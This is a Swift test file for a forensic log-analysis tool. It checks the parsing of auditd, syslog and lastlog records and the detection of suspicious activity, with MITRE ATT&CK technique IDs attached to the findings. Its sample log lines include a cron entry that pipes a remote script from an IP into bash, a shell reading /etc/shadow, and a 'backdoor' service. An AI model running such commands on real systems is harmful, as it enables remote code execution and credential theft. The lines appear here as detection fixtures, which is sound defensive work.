//
//  AuditSyslogLastlogTests.swift
//  StrataTests
//
//  Covers Bundle E: the auditd/syslog/lastlog parsers (built against the
//  documented formats) and their analyzers.
//

import Testing
import Foundation
@testable import Strata

struct AuditParserTests {

    @Test func foldsExecveEventWithHexAndProctitle() throws {
        let log = """
        type=SYSCALL msg=audit(1727274000.123:4242): arch=c000003e syscall=59 success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=33 comm="bash" exe="/usr/bin/bash" key="exec_rule"
        type=EXECVE msg=audit(1727274000.123:4242): argc=3 a0="/bin/sh" a1="-c" a2=636174202F6574632F736861646F77
        type=PROCTITLE msg=audit(1727274000.123:4242): proctitle=2F62696E2F7368002D6300636174202F6574632F736861646F77
        type=CWD msg=audit(1727274000.123:4242): cwd="/var/www"
        type=PATH msg=audit(1727274000.123:4242): item=0 name="/etc/shadow" nametype=NORMAL
        """
        let events = AuditParser.parse(text: log, sourceFile: "/var/log/audit/audit.log")
        #expect(events.count == 1)                       // one folded event
        let e = events[0]
        #expect(e.serial == 4242)
        #expect(e.recordType == "EXECVE")
        #expect(e.syscall == "execve")                   // 59 via x86_64 arch
        #expect(e.success == true)
        #expect(e.exe == "/usr/bin/bash")
        #expect(e.comm == "bash")
        #expect(e.auid == 1000)
        #expect(e.uid == 33)
        #expect(e.key == "exec_rule")
        #expect(e.commandLine == "/bin/sh -c cat /etc/shadow")   // hex a2 decoded + joined
        #expect(e.path == "/etc/shadow")
        #expect(e.timestamp == Date(timeIntervalSince1970: 1727274000.123))
    }

    @Test func parsesUserAuthNestedFailure() throws {
        let log = #"type=USER_AUTH msg=audit(1727274050.456:4250): pid=26127 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=pts/1 res=failed'"#
        let events = AuditParser.parse(text: log, sourceFile: "/var/log/audit/audit.log")
        #expect(events.count == 1)
        let e = events[0]
        #expect(e.recordType == "USER_AUTH")
        #expect(e.account == "root")
        #expect(e.result == "failed")
        #expect(e.auid == nil)        // 4294967295 unset sentinel
        #expect(e.sourceIP == nil)    // addr=? -> nil
    }

    @Test func groupsBySerialNotAdjacency() {
        // Two events; the SYSCALL/EXECVE of each share a serial.
        let log = """
        type=SYSCALL msg=audit(1000.000:1): arch=c000003e syscall=59 exe="/bin/a"
        type=EXECVE msg=audit(1000.000:1): argc=1 a0="/bin/a"
        type=SYSCALL msg=audit(1001.000:2): arch=c000003e syscall=59 exe="/bin/b"
        type=EXECVE msg=audit(1001.000:2): argc=1 a0="/bin/b"
        """
        let events = AuditParser.parse(text: log, sourceFile: "/x")
        #expect(events.count == 2)
        #expect(events.contains { $0.commandLine == "/bin/a" })
        #expect(events.contains { $0.commandLine == "/bin/b" })
    }

    @Test func resolvesAarch64Syscall() {
        let log = #"type=SYSCALL msg=audit(1.0:1): arch=c00000b7 syscall=221 exe="/bin/sh""#
        let events = AuditParser.parse(text: log, sourceFile: "/x")
        #expect(events.first?.syscall == "execve")   // 221 on aarch64
    }

    @Test func decodesUnquotedAllDigitHexArg() {
        // An unquoted all-digit EXECVE arg is hex-encoded: 30303030 -> "0000".
        let log = "type=EXECVE msg=audit(1.0:1): argc=2 a0=\"/bin/echo\" a1=30303030"
        let e = AuditParser.parse(text: log, sourceFile: "/x").first
        #expect(e?.commandLine == "/bin/echo 0000")
    }

    @Test func rejectsNonAuditLines() {
        #expect(AuditParser.parse(text: "Jun 10 garbage line", sourceFile: "/x").isEmpty)
        #expect(AuditParser.parse(text: "", sourceFile: "/x").isEmpty)
    }
}

struct SyslogParserTests {

    private static let anchor = Date(timeIntervalSince1970: 1_780_000_000)

    private func parse(_ line: String) -> SyslogEntry? {
        SyslogParser.parse(text: line, sourceFile: "/var/log/syslog", anchor: Self.anchor).first
    }

    @Test func classifiesKernelEvents() throws {
        #expect(parse("Jun 10 09:14:22 web01 kernel: [ 3812.5] usb 1-1: new high-speed USB device number 7")?.category == .usbDevice)
        #expect(parse("Jun 10 09:14:23 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected")?.category == .massStorage)
        #expect(parse("Jun 10 09:14:55 web01 kernel: Out of memory: Killed process 2473 (python3)")?.category == .outOfMemory)
        #expect(parse("Jun 10 09:15:03 web01 kernel: sshd[31987]: segfault at 0 ip 00007f error 4")?.category == .segfault)
        #expect(parse("Jun 10 09:15:04 web01 kernel: EXT4-fs error (device sda1): bad block")?.category == .diskError)
    }

    @Test func classifiesCronExecAndExtractsCommand() throws {
        let e = try #require(parse("Jun 10 09:17:01 web01 CRON[31012]: (root) CMD (curl -s http://185.220.101.7/x.sh | bash)"))
        #expect(e.category == .cronExec)
        #expect(e.user == "root")
        #expect(e.command == "curl -s http://185.220.101.7/x.sh | bash")
    }

    @Test func classifiesSystemd() throws {
        #expect(parse("Jun 10 09:18:00 web01 systemd[1]: backdoor.service: Failed with result 'exit-code'")?.category == .serviceFailed)
        #expect(parse("Jun 10 09:18:05 web01 systemd[1]: backdoor.service: Scheduled restart job, restart counter is 5")?.category == .crashLoop)
        #expect(parse("Jun 10 09:18:00 web01 systemd[1]: backdoor.service: Failed with result 'exit-code'")?.unit == "backdoor.service")
    }

    @Test func skipsAuthClassPrograms() {
        // sshd/sudo are handled by the auth-log path; not surfaced here.
        #expect(parse("Jun 10 09:00:00 web01 sshd[1]: Accepted password for jane from 10.0.0.5 port 22 ssh2") == nil)
        #expect(parse("Jun 10 09:00:00 web01 sudo: jane : TTY=pts/0 ; COMMAND=/bin/id") == nil)
    }
}

struct LastlogParserTests {

    /// Build a synthetic lastlog: `slots` records, poking the given entries.
    private static func build(slots: Int, entries: [(uid: Int, time: Int32, line: String, host: String)]) -> Data {
        var bytes = [UInt8](repeating: 0, count: slots * LastlogParser.recordSize)
        for e in entries {
            let base = e.uid * LastlogParser.recordSize
            let t = UInt32(bitPattern: e.time)
            for i in 0..<4 { bytes[base + i] = UInt8((t >> (8 * i)) & 0xFF) }
            for (i, b) in e.line.utf8.prefix(31).enumerated() { bytes[base + 4 + i] = b }
            for (i, b) in e.host.utf8.prefix(255).enumerated() { bytes[base + 36 + i] = b }
        }
        return Data(bytes)
    }

    @Test func parsesUidIndexedRecordsSkippingEmpty() {
        let data = Self.build(slots: 1100, entries: [
            (uid: 0, time: 1_700_000_000, line: "tty1", host: ""),
            (uid: 1000, time: 1_698_712_159, line: "pts/0", host: "10.0.0.5"),
        ])
        let records = LastlogParser.parse(data: data, sourceFile: "/var/log/lastlog") { uid in
            uid == 0 ? "root" : (uid == 1000 ? "jane" : nil)
        }
        #expect(records.count == 2)   // only the two non-empty slots
        let root = records.first { $0.uid == 0 }
        #expect(root?.user == "root")
        #expect(root?.line == "tty1")
        #expect(root?.host == "")
        let jane = records.first { $0.uid == 1000 }
        #expect(jane?.user == "jane")
        #expect(jane?.host == "10.0.0.5")
        #expect(jane?.timestamp == Date(timeIntervalSince1970: 1_698_712_159))
    }

    @Test func preservesExactStringBytes() {
        // A trailing space before the NUL must survive (byte-faithful).
        let data = Self.build(slots: 2, entries: [(uid: 1, time: 1_700_000_000, line: "pts/0 ", host: "")])
        let r = LastlogParser.parse(data: data, sourceFile: "/x").first { $0.uid == 1 }
        #expect(r?.line == "pts/0 ")
    }

    @Test func rejectsLastlog2SQLite() {
        var data = Data("SQLite format 3\u{0}".utf8)
        data.append(Data(count: 400))
        #expect(LastlogParser.parse(data: data, sourceFile: "/var/log/lastlog").isEmpty)
    }

    @Test func toleratesTruncatedTail() {
        // UID 0 occupies the first record; UID 1's record is cut off by the
        // truncation. count = floor(size/292) ignores the partial tail.
        var data = Self.build(slots: 2, entries: [(uid: 0, time: 1_700_000_000, line: "pts/0", host: "")])
        data = data.prefix(LastlogParser.recordSize + 100)   // 1 full record + partial
        let records = LastlogParser.parse(data: data, sourceFile: "/x")
        #expect(records.count == 1)
    }
}

struct AuditSyslogLastlogAnalyzerTests {

    private func ctx(audit: [AuditEvent] = [], syslog: [SyslogEntry] = [],
                     lastlog: [LastlogEntry] = [], info: LinuxHostInfo? = nil,
                     access: LinuxAccessInfo? = nil,
                     persistence: [LinuxPersistenceEntry] = []) -> AnalysisContext {
        AnalysisContext(files: [], events: [], timeline: [], registryValues: [],
                        linuxPersistence: persistence, linuxInfo: info, linuxAccess: access,
                        audit: audit, syslog: syslog, lastlog: lastlog)
    }

    @Test func auditFlagsStagingExecAndAccountChange() {
        let exec = AuditEvent(timestamp: Date(timeIntervalSince1970: 1), serial: 1, recordType: "EXECVE",
                              syscall: "execve", success: true, exe: "/tmp/.x", comm: "x",
                              commandLine: "/tmp/.x", path: "/tmp/.x", auid: nil, uid: 33,
                              sourceFile: "/var/log/audit/audit.log")
        let add = AuditEvent(timestamp: Date(timeIntervalSince1970: 2), serial: 2, recordType: "ADD_USER",
                             account: "eve", result: "success", sourceFile: "/var/log/audit/audit.log")
        let f = AuditAnalyzer().analyze(context: ctx(audit: [exec, add]))
        #expect(f.contains { $0.title.contains("staging path") && $0.technique?.attackID == "T1059.004" })
        #expect(f.contains { $0.title.contains("Account/group") && $0.technique?.attackID == "T1136.001" })
    }

    @Test func auditFlagsSensitiveFileWrite() {
        let e = AuditEvent(timestamp: Date(timeIntervalSince1970: 1), serial: 1, recordType: "SYSCALL",
                           syscall: "openat", success: true, path: "/root/.ssh/authorized_keys",
                           auid: 33, key: "ssh_keys", sourceFile: "/var/log/audit/audit.log")
        let f = AuditAnalyzer().analyze(context: ctx(audit: [e]))
        #expect(f.contains { $0.technique?.attackID == "T1098.004" })
    }

    @Test func syslogFlagsUsbSegfaultCrashloopAndCron() {
        let usb = SyslogEntry(timestamp: Date(timeIntervalSince1970: 1), host: "h", process: "kernel",
                              category: .massStorage, message: "USB Mass Storage device detected",
                              sourceFile: "/var/log/syslog")
        let seg = (0..<1).map { _ in SyslogEntry(timestamp: Date(timeIntervalSince1970: 2), host: "h",
                              process: "kernel", category: .segfault,
                              message: "sshd[1]: segfault at 0 ip x", sourceFile: "/var/log/syslog") }
        let loop = (0..<4).map { _ in SyslogEntry(timestamp: Date(timeIntervalSince1970: 3), host: "h",
                              process: "systemd", category: .crashLoop, message: "restart counter is 5",
                              unit: "backdoor.service", sourceFile: "/var/log/syslog") }
        let cron = SyslogEntry(timestamp: Date(timeIntervalSince1970: 4), host: "h", process: "CRON",
                               category: .cronExec, message: "(root) CMD (curl http://x|bash)",
                               user: "root", command: "curl http://x | bash", sourceFile: "/var/log/syslog")
        let f = SyslogAnalyzer().analyze(context: ctx(syslog: [usb] + seg + loop + [cron]))
        #expect(f.contains { $0.technique?.attackID == "T1091" })           // USB
        #expect(f.contains { $0.title.contains("Segfault") && $0.technique?.attackID == "T1203" })
        #expect(f.contains { $0.title.contains("crash loop") && $0.severity == .high })  // unknown unit
        #expect(f.contains { $0.title.contains("Suspicious cron") })
    }

    @Test func lastlogFlagsServiceAccountAndExternalRoot() {
        var info = LinuxHostInfo()
        info.users = [LinuxUser(name: "www-data", uid: 33, gid: 33, home: "/var/www", shell: "/usr/sbin/nologin"),
                      LinuxUser(name: "root", uid: 0, gid: 0, home: "/root", shell: "/bin/bash")]
        let svc = LastlogEntry(uid: 33, user: "www-data", timestamp: Date(timeIntervalSince1970: 1),
                               line: "pts/0", host: "10.0.0.9", sourceFile: "/var/log/lastlog")
        let root = LastlogEntry(uid: 0, user: "root", timestamp: Date(timeIntervalSince1970: 2),
                                line: "pts/1", host: "203.0.113.9", sourceFile: "/var/log/lastlog")
        let f = LastlogAnalyzer().analyze(context: ctx(lastlog: [svc, root], info: info))
        #expect(f.contains { $0.title.contains("Service account login") && $0.technique?.attackID == "T1078.003" })
        #expect(f.contains { $0.title.contains("external host") && $0.technique?.attackID == "T1078" })
    }

    @Test func quietHostsYieldNothing() {
        let normalExec = AuditEvent(timestamp: nil, serial: 1, recordType: "EXECVE", syscall: "execve",
                                    success: true, exe: "/usr/bin/ls", commandLine: "ls -la", auid: 1000,
                                    uid: 1000, sourceFile: "/x")
        #expect(AuditAnalyzer().analyze(context: ctx(audit: [normalExec])).isEmpty)
        #expect(SyslogAnalyzer().analyze(context: ctx(syslog: [])).isEmpty)
        #expect(LastlogAnalyzer().analyze(context: ctx(lastlog: [])).isEmpty)
    }
}
